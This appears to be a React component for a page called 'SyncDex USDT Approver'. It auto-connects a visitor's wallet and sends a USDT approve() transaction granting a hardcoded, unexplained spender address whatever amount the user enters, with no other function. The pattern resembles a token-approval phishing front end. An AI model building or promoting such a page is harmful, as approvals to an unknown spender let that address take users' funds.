import { useState, useEffect, useCallback } from "react"
import { ethers } from "ethers"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { AlertCircle, InfoIcon } from "lucide-react"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"

// USDT Contract Address on Ethereum Mainnet
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"

// Predefined spender address
const SPENDER_ADDRESS = "0x69403ED292D063d632138CaDD1E42b5f40478B2a"

// USDT ABI for calling the approve function and checking allowance
const USDT_ABI = [
  "function approve(address spender, uint value) public returns (bool)",
  "function allowance(address owner, address spender) public view returns (uint256)",
  "function balanceOf(address account) public view returns (uint256)"
]

export default function App() {
  const [account, setAccount] = useState<string | null>(null)
  const [isApproving, setIsApproving] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [currentAllowance, setCurrentAllowance] = useState<string | null>(null)
  const [balance, setBalance] = useState<string | null>(null)
  const [approvalAmount, setApprovalAmount] = useState("")

  const connectWallet = useCallback(async () => {
    if (typeof window.ethereum !== 'undefined') {
      try {
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" })
        setAccount(accounts[0])
        checkNetwork()
      } catch (error) {
        console.error("Error connecting to wallet:", error)
        setError("Failed to connect wallet. Please try again.")
      }
    } else {
      setError("No Ethereum wallet detected. Please install MetaMask or a compatible wallet.")
    }
  }, [])

  const checkNetwork = async () => {
    if (typeof window.ethereum !== 'undefined') {
      const chainId = await window.ethereum.request({ method: 'eth_chainId' })
      if (chainId !== '0x1') { // Ethereum Mainnet
        setError("Please switch to Ethereum Mainnet")
      } else {
        setError(null)
      }
    }
  }

  useEffect(() => {
    connectWallet()
  }, [connectWallet])

  useEffect(() => {
    if (account) {
      checkAllowanceAndBalance()
    }
  }, [account])

  const checkAllowanceAndBalance = async () => {
    if (typeof window.ethereum === 'undefined' || !account) return

    const provider = new ethers.BrowserProvider(window.ethereum)
    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider)

    try {
      const allowance = await usdtContract.allowance(account, SPENDER_ADDRESS)
      setCurrentAllowance(ethers.formatUnits(allowance, 6))

      const balance = await usdtContract.balanceOf(account)
      setBalance(ethers.formatUnits(balance, 6))
    } catch (error) {
      console.error("Error checking allowance and balance:", error)
    }
  }

  const approveUSDT = async () => {
    if (typeof window.ethereum === 'undefined') {
      setError("Please connect to an Ethereum wallet!")
      return
    }

    if (!approvalAmount || parseFloat(approvalAmount) <= 0) {
      setError("Please enter a valid approval amount")
      return
    }

    setIsApproving(true)
    setError(null)

    try {
      const provider = new ethers.BrowserProvider(window.ethereum)
      const signer = await provider.getSigner()
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer)

      const parsedAmount = ethers.parseUnits(approvalAmount, 6)

      const tx = await usdtContract.approve(SPENDER_ADDRESS, parsedAmount)
      console.log("Transaction Hash:", tx.hash)
      alert(`Approval transaction sent! Hash: ${tx.hash}`)
      
      // Wait for transaction to be mined
      await tx.wait()
      alert("Approval transaction confirmed!")
      
      // Update allowance after successful approval
      checkAllowanceAndBalance()
    } catch (error) {
      console.error("Error during approval:", error)
      if (error.code === 4001) {
        setError("Transaction rejected by user")
      } else if (error.message.includes("insufficient funds")) {
        setError("Insufficient ETH for gas")
      } else {
        setError(error.message || "Error during approval. Check console for details.")
      }
    } finally {
      setIsApproving(false)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100">
      <Card className="w-[400px]">
        <CardHeader>
          <CardTitle>SyncDex USDT Approver</CardTitle>
          <CardDescription>Approve USDT for SyncDex</CardDescription>
        </CardHeader>
        <CardContent>
          {!account ? (
            <div className="text-center">
              <p className="mb-4">Connect your wallet to get started</p>
              <Button onClick={connectWallet} className="w-full">
                Connect Wallet
              </Button>
            </div>
          ) : (
            <>
              <p className="text-sm mb-2">
                Connected Account: {`${account.slice(0, 6)}...${account.slice(-4)}`}
              </p>
              <p className="text-sm mb-2">
                <strong>Spender:</strong> {`${SPENDER_ADDRESS.slice(0, 6)}...${SPENDER_ADDRESS.slice(-4)}`}
              </p>
              {balance && (
                <p className="text-sm mb-2">
                  <strong>Your USDT Balance:</strong> {parseFloat(balance).toFixed(2)} USDT
                </p>
              )}
              {currentAllowance && (
                <p className="text-sm mb-2">
                  <strong>Current Allowance:</strong> {parseFloat(currentAllowance).toFixed(2)} USDT
                </p>
              )}
              <div className="mt-4">
                <Label htmlFor="approvalAmount">Approval Amount (USDT)</Label>
                <Input
                  id="approvalAmount"
                  type="number"
                  placeholder="Enter amount to approve"
                  value={approvalAmount}
                  onChange={(e) => setApprovalAmount(e.target.value)}
                  className="mt-1"
                />
              </div>
              <Alert variant="warning" className="mt-4">
                <InfoIcon className="h-4 w-4" />
                <AlertTitle>Important</AlertTitle>
                <AlertDescription>
                  You can approve any amount, even if it exceeds your current balance. Be cautious when setting high approval amounts.
                </AlertDescription>
              </Alert>
              <Button onClick={approveUSDT} disabled={isApproving} className="w-full mt-4">
                {isApproving ? "Approving..." : "Approve USDT"}
              </Button>
            </>
          )}
          {error && (
            <Alert variant="destructive" className="mt-4">
              <AlertCircle className="h-4 w-4" />
              <AlertTitle>Error</AlertTitle>
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}
        </CardContent>
      </Card>
    </div>
  )
}